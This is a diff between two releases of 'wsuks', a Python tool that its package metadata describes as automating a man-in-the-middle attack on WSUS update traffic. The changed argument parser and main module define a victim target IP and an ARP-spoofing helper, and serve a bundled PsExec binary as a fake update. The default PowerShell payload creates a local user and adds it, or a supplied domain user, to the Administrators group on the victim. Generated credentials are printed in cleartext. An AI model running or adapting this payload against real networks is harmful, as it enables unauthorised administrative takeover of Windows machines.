# Comparing `tmp/wsuks-0.3.1.tar.gz` & `tmp/wsuks-0.4.0.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "wsuks-0.3.1.tar", max compression
+gzip compressed data, was "wsuks-0.4.0.tar", max compression
```

## Comparing `wsuks-0.3.1.tar` & `wsuks-0.4.0.tar`

### file list

```diff
@@ -1,23 +1,23 @@
--rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.3.1/LICENSE
--rw-r--r--   0        0        0     2151 2023-07-04 20:57:09.903154 wsuks-0.3.1/README.md
--rw-r--r--   0        0        0      523 2023-07-08 10:37:14.955366 wsuks-0.3.1/pyproject.toml
--rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.3.1/wsuks/__init__.py
--rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.3.1/wsuks/executables/PsExec.exe
--rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.3.1/wsuks/executables/PsExec64.exe
--rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.3.1/wsuks/helpers/__init__.py
--rw-r--r--   0        0        0     3283 2023-07-07 11:20:23.173546 wsuks-0.3.1/wsuks/helpers/argparser.py
--rw-r--r--   0        0        0     3306 2023-07-07 23:08:04.680283 wsuks-0.3.1/wsuks/helpers/arpspoofer.py
--rw-r--r--   0        0        0     2628 2023-07-07 23:26:14.448306 wsuks-0.3.1/wsuks/helpers/logger.py
--rw-r--r--   0        0        0     3361 2023-07-07 23:08:04.680283 wsuks-0.3.1/wsuks/helpers/sysvolparser.py
--rw-r--r--   0        0        0    10323 2023-07-07 23:20:30.360298 wsuks-0.3.1/wsuks/helpers/wsusserver.py
--rw-r--r--   0        0        0     3603 2023-07-07 23:34:44.580316 wsuks-0.3.1/wsuks/wsuks.py
--rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.3.1/wsuks/xml_files/get-authorization-cookie.xml
--rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.3.1/wsuks/xml_files/get-config.xml
--rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.3.1/wsuks/xml_files/get-cookie.xml
--rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.3.1/wsuks/xml_files/get-extended-update-info.xml
--rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.3.1/wsuks/xml_files/internal-error.xml
--rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.3.1/wsuks/xml_files/register-computer.xml
--rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.3.1/wsuks/xml_files/report-event-batch.xml
--rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.3.1/wsuks/xml_files/sync-updates.xml
--rw-r--r--   0        0        0     3115 1970-01-01 00:00:00.000000 wsuks-0.3.1/setup.py
--rw-r--r--   0        0        0     2807 1970-01-01 00:00:00.000000 wsuks-0.3.1/PKG-INFO
+-rw-r--r--   0        0        0     1301 2023-04-06 19:28:11.193610 wsuks-0.4.0/LICENSE
+-rw-r--r--   0        0        0     2999 2023-07-08 18:26:45.324871 wsuks-0.4.0/README.md
+-rw-r--r--   0        0        0      523 2023-07-08 18:53:50.080905 wsuks-0.4.0/pyproject.toml
+-rw-r--r--   0        0        0        0 2023-07-01 15:16:02.001468 wsuks-0.4.0/wsuks/__init__.py
+-rw-r--r--   0        0        0   717232 2023-03-30 14:57:14.000000 wsuks-0.4.0/wsuks/executables/PsExec.exe
+-rw-r--r--   0        0        0   831888 2023-03-30 14:57:14.000000 wsuks-0.4.0/wsuks/executables/PsExec64.exe
+-rw-r--r--   0        0        0        0 2023-03-19 17:44:56.143981 wsuks-0.4.0/wsuks/helpers/__init__.py
+-rw-r--r--   0        0        0     3107 2023-07-08 18:15:56.196858 wsuks-0.4.0/wsuks/helpers/argparser.py
+-rw-r--r--   0        0        0     3306 2023-07-07 23:08:04.680283 wsuks-0.4.0/wsuks/helpers/arpspoofer.py
+-rw-r--r--   0        0        0     2628 2023-07-07 23:26:14.448306 wsuks-0.4.0/wsuks/helpers/logger.py
+-rw-r--r--   0        0        0     3383 2023-07-08 17:51:21.092827 wsuks-0.4.0/wsuks/helpers/sysvolparser.py
+-rw-r--r--   0        0        0    10323 2023-07-07 23:20:30.360298 wsuks-0.4.0/wsuks/helpers/wsusserver.py
+-rw-r--r--   0        0        0     4438 2023-07-08 18:52:59.828904 wsuks-0.4.0/wsuks/wsuks.py
+-rw-r--r--   0        0        0      583 2023-04-06 19:28:41.085610 wsuks-0.4.0/wsuks/xml_files/get-authorization-cookie.xml
+-rw-r--r--   0        0        0      838 2023-04-06 19:28:44.697610 wsuks-0.4.0/wsuks/xml_files/get-config.xml
+-rw-r--r--   0        0        0      526 2023-04-06 19:28:47.697610 wsuks-0.4.0/wsuks/xml_files/get-cookie.xml
+-rw-r--r--   0        0        0     4247 2023-04-06 19:28:51.417611 wsuks-0.4.0/wsuks/xml_files/get-extended-update-info.xml
+-rw-r--r--   0        0        0      469 2023-04-06 19:28:58.353611 wsuks-0.4.0/wsuks/xml_files/internal-error.xml
+-rw-r--r--   0        0        0      364 2023-04-06 19:29:04.397611 wsuks-0.4.0/wsuks/xml_files/register-computer.xml
+-rw-r--r--   0        0        0      418 2023-04-06 19:29:08.141611 wsuks-0.4.0/wsuks/xml_files/report-event-batch.xml
+-rw-r--r--   0        0        0     3295 2023-04-06 19:29:12.273611 wsuks-0.4.0/wsuks/xml_files/sync-updates.xml
+-rw-r--r--   0        0        0     3966 1970-01-01 00:00:00.000000 wsuks-0.4.0/setup.py
+-rw-r--r--   0        0        0     3655 1970-01-01 00:00:00.000000 wsuks-0.4.0/PKG-INFO
```

### Comparing `wsuks-0.3.1/LICENSE` & `wsuks-0.4.0/LICENSE`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/pyproject.toml` & `wsuks-0.4.0/pyproject.toml`

 * *Files 2% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 [tool.poetry]
 name = "wsuks"
-version = "0.3.1"
+version = "0.4.0"
 description = "A Tool for automating the MITM attack on the WSUS connection"
 authors = ["Alexander Neff <alex99.neff@gmx.de>"]
 readme = "README.md"
 license = "MIT"
 packages = [
     { include = "wsuks" }
 ]
```

### Comparing `wsuks-0.3.1/wsuks/executables/PsExec.exe` & `wsuks-0.4.0/wsuks/executables/PsExec.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/executables/PsExec64.exe` & `wsuks-0.4.0/wsuks/executables/PsExec64.exe`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/helpers/argparser.py` & `wsuks-0.4.0/wsuks/helpers/argparser.py`

 * *Files 8% similar despite different names*

```diff
@@ -24,30 +24,31 @@
                  Version: {__version__}
 """)
 
 
 def initParser():
     example_text = """Examples:
     wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2
-    wsuks -t 192.168.0.10 -u User -p Password123 -dc-ip 192.168.0.1
+    wsuks -t 192.168.0.10 --WSUS-Server 192.168.0.2 -u User -p Password123 -d Domain.local
+    wsuks -t 192.168.0.10 -u User -p Password123 -d Domain.local -dc-ip 192.168.0.1
     """
     parser = argparse.ArgumentParser(prog='wsuks', epilog=example_text, formatter_class=RawTextHelpFormatter)
 
     parser.add_argument('-v', '--version', action='version', version='Current Version: %(prog)s 2.0')
-    parser.add_argument('-d', '--debug', action='store_true', help='Enable debug output')
+    parser.add_argument('--debug', action='store_true', help='Enable debug output')
 
     parser.add_argument('-t', '--target-ip', metavar='', dest='targetIp', help='IP Address of the victim Client. (REQUIRED)', required=True)
     parser.add_argument('-I', '--interface', metavar='', help='Network Interface to use. (DEFAULT: %(default)s)', default='eth0')
     parser.add_argument('-e', '--executable', metavar='', default=f'{dirname(wsuks.__file__)}/executables/PsExec64.exe',type=argparse.FileType('rb'), help='The executable to returned to the victim. It has to be signed by Microsoft (DEFAULT: %(default)s)')
-    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'New-LocalUser -Name "WSUKS_USER" -Password $(ConvertTo-SecureString "WSUKS_PASSWORD" -AsPlainText -Force) -Fullname "wsuks user" -Description "This user was generated by the wsuks Tool"; Add-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "WSUKS_USER"\'')
+    parser.add_argument('-c', '--command', metavar='', help='The command to execute on the victim. (DEFAULT: %(default)s)', default='/accepteula /s powershell.exe \'PREFIXAdd-LocalGroupMember -Group $(Get-LocalGroup -SID S-1-5-32-544 | Select Name) -Member "WSUKS_USER"\'')
 
     simple = parser.add_argument_group('AUTOMATIC MODE', 'Discover the WSUS Server automatically by searching for GPOs in SYSVOL. (Default)')
-    simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with. (Required in automatic Mode)')
-    simple.add_argument('-p', '--password', metavar='', help='Password to authenticate with. (Required in automatic Mode)')
-    simple.add_argument('-dc-ip', metavar='', dest='dcIp', help='IP Address of the domain controller. (Required in automatic Mode)')
-    simple.add_argument('--domain', metavar='', help='Domain to authenticate with. (Optional)')
+    simple.add_argument('-u', '--username', metavar='', help='Username to authenticate with')
+    simple.add_argument('-p', '--password', metavar='', help='Password to authenticate with')
+    simple.add_argument('-dc-ip', metavar='', dest='dcIp', help='IP Address of the domain controller')
+    simple.add_argument('-d', '--domain', metavar='', help='Domain to authenticate with')
 
     advanced = parser.add_argument_group('MANUAL MODE', 'If you know the WSUS Server, you can use this mode to skip the automatic discovery.')
     advanced.add_argument('--WSUS-Server', metavar='', dest='wsusIp', help='IP Address of the WSUS Server.')
     advanced.add_argument('--WSUS-Port', metavar='', dest='wsusPort', type=int, default=8530, help='Port of the WSUS Server. (DEFAULT: %(default)s)')
 
     return parser.parse_args()
```

### Comparing `wsuks-0.3.1/wsuks/helpers/arpspoofer.py` & `wsuks-0.4.0/wsuks/helpers/arpspoofer.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/helpers/logger.py` & `wsuks-0.4.0/wsuks/helpers/logger.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/helpers/sysvolparser.py` & `wsuks-0.4.0/wsuks/helpers/sysvolparser.py`

 * *Files 2% similar despite different names*

```diff
@@ -61,16 +61,16 @@
             sys.exit(1)
         """
         Get the WSUS server from the sysvol share
 
         :param smbClient: SMB connection to Domain Controller
         :return: WSUS server IP and Port
         """
-        if not username or not password or not dcIp:
-            self.logger.error("Error: Domain Controller IP, Username and Password are required to search for WSUS Server in SYSVOL Share. Exiting...")
+        if not username or not password or not dcIp or not domain:
+            self.logger.error("Error: Domain Controller IP, Username, Password and Domain are required to search for WSUS Server in SYSVOL Share. Exiting...")
             sys.exit(1)
 
         try:
             self._createSMBConnection(domain, username, password, dcIp)
             self.wsusIp, self.wsusPort = self._extractWsusServerSYSVOL()
         except Exception as e:
             self.logger.error(f"Error: {e}")
```

### Comparing `wsuks-0.3.1/wsuks/helpers/wsusserver.py` & `wsuks-0.4.0/wsuks/helpers/wsusserver.py`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/wsuks.py` & `wsuks-0.4.0/wsuks/wsuks.py`

 * *Files 16% similar despite different names*

```diff
@@ -24,15 +24,24 @@
         self.local_password = "".join(random.sample(ascii_letters, 16))
 
         # Set args
         self.targetIp = args.targetIp  # Never None (required)
         self.executable_file = args.executable.read()
         self.executable_name = os.path.basename(args.executable.name)
         args.executable.close()
-        self.command = args.command.replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
+
+        # Set Command
+        self.command_prefix = 'New-LocalUser -Name "WSUKS_USER" -Password $(ConvertTo-SecureString "WSUKS_PASSWORD" -AsPlainText -Force) -Fullname "wsuks user" -Description "This user was generated by the wsuks Tool"; '
+        if args.username and args.password and args.domain:
+            self.logger.success(f"Using domain user for the WSUS attack: User={colored(args.username, 'green', attrs=['bold'])} Password={colored(args.password, 'green', attrs=['bold'])} Domain={colored(args.domain, 'green', attrs=['bold'])}")
+            self.command = args.command.replace("PREFIX", "").replace("WSUKS_USER", args.domain + "\\" + args.username).replace("WSUKS_PASSWORD", args.password)
+        else:
+            self.logger.success(f"Generated local user for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
+            self.command = args.command.replace("PREFIX", self.command_prefix).replace("WSUKS_USER", self.local_username).replace("WSUKS_PASSWORD", self.local_password)
+        self.logger.success(f"Command to execute: {self.command}")
 
         self.wsusIp = args.wsusIp
         self.wsusPort = args.wsusPort  # Default 8530
         self.domain_username = args.username
         self.domain_password = args.password
         self.domain = args.domain
         self.dcIp = args.dcIp
@@ -56,15 +65,14 @@
         update_handler.set_resources_xml(self.command)
 
         self.logger.debug(update_handler)
 
         # Prepare WSUS HTTP Server
         wsusBaseServer = WSUSBaseServer(update_handler)
         http_server = HTTPServer((self.hostIp, self.wsusPort), wsusBaseServer)
-        self.logger.success(f"Generated Credentials for the WSUS attack: Username={colored(self.local_username, 'green', attrs=['bold'])} Password={colored(self.local_password, 'green', attrs=['bold'])}")
         try:
             self.logger.info(f"Starting WSUS Server on {self.hostIp}:{self.wsusPort}...")
             http_server.serve_forever()
         except KeyboardInterrupt:
             print("")
             self.logger.info("Stopping WSUS Server...")
         finally:
```

### Comparing `wsuks-0.3.1/wsuks/xml_files/get-authorization-cookie.xml` & `wsuks-0.4.0/wsuks/xml_files/get-authorization-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/xml_files/get-config.xml` & `wsuks-0.4.0/wsuks/xml_files/get-config.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/xml_files/get-cookie.xml` & `wsuks-0.4.0/wsuks/xml_files/get-cookie.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/xml_files/get-extended-update-info.xml` & `wsuks-0.4.0/wsuks/xml_files/get-extended-update-info.xml`

 * *Files identical despite different names*

### Comparing `wsuks-0.3.1/wsuks/xml_files/sync-updates.xml` & `wsuks-0.4.0/wsuks/xml_files/sync-updates.xml`

 * *Files identical despite different names*

